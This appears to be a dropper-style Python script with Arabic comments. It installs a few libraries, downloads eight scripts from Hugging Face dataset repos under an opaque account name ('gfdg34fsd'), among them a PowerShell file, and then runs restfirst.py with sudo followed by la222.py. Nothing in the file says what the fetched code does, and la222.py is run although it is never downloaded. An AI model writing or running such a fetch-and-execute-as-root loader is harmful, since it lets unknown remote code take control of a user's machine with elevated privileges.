import os
from pathlib import Path
import subprocess
import sys
import zipfile

os.environ["PYTHONIOENCODING"] = "utf-8"


def install_package(package_name):
    """تثبيت مكتبة باستخدام pip"""
    print(f"جاري تثبيت مكتبة {package_name}...")
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package_name]
        )
        print(f"تم تثبيت {package_name} بنجاح.")
        return True
    except Exception as e:
        print(f"فشل تثبيت {package_name}: {e}")
        return False


# 1. القائمة المقتصرة فقط على الشبكات والموارد الأساسية
REQUIRED_PACKAGES = {
    "requests": "requests",
    "psutil": "psutil",
    "setuptools": "setuptools",
    "pytz": "pytz",
}

# التحقق من وجود المكتبات الأساسية وتثبيتها
for import_name, pip_name in REQUIRED_PACKAGES.items():
    try:
        __import__(import_name)
    except ImportError:
        print(f"مكتبة {pip_name} غير مثبتة. سيتم تثبيتها الآن...")
        if not install_package(pip_name):
            print(f"خطأ: لا يمكن المتابعة بدون مكتبة {pip_name}.")
            sys.exit(1)

import requests

# ======================== Configuration ========================
DOWNLOAD_URLS = [
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/in.ps1",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/hash.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1first.py",
    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/openShrinkNew.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/prep.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/rest.py",
    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/restfirst.py",
]

TARGET_DIR = Path.cwd() / "downloaded_files"
PYTHON_SCRIPTS = ["restfirst.py", "la222.py"]

# ======================== Helper Functions ========================
def download_file(url: str, dest_path: Path) -> bool:
    try:
        print(f"Downloading {url} -> {dest_path}")
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        with open(dest_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Downloaded: {dest_path}")
        return True
    except Exception as e:
        print(f"Failed to download {url}: {e}")
        return False


def download_all_files() -> bool:
    TARGET_DIR.mkdir(parents=True, exist_ok=True)
    success = True
    for url in DOWNLOAD_URLS:
        filename = url.split("/")[-1]
        dest = TARGET_DIR / filename
        if not download_file(url, dest):
            success = False
    return success


def run_python_script(script_name: str, use_sudo: bool = False) -> bool:
    """
    تشغيل سكربت بايثون مع إمكانية استخدام sudo.
    """
    script_path = TARGET_DIR / script_name
    if not script_path.exists():
        print(f"Python script not found: {script_path}")
        return False
    try:
        print(f"Running {script_name} ...")
        if use_sudo:
            # تشغيل السكربت مع sudo (صلاحيات مرتفعة)
            cmd = ["sudo", sys.executable, str(script_path)]
        else:
            cmd = [sys.executable, str(script_path)]
        result = subprocess.run(cmd, cwd=TARGET_DIR)
        if result.returncode != 0:
            print(f"Script {script_name} failed.")
            return False
        return True
    except Exception as e:
        print(f"Failed to run {script_name}: {e}")
        return False


# ======================== Main Workflow ========================
def main():
    print("=== Step 1: Download all files ===")
    if not download_all_files():
        print("Some downloads failed. Aborting.")
        return 1

    print("\n=== Step 2: Run Python scripts in order ===")
    for script in PYTHON_SCRIPTS:
        # تشغيل restfirst.py مع sudo، والباقي بدون
        use_sudo = (script == "restfirst.py")
        if not run_python_script(script, use_sudo=use_sudo):
            print(f"Failed at script {script}. Aborting.")
            return 1

    print("\n=== All tasks completed successfully ===")
    return 0


if __name__ == "__main__":
    sys.exit(main())
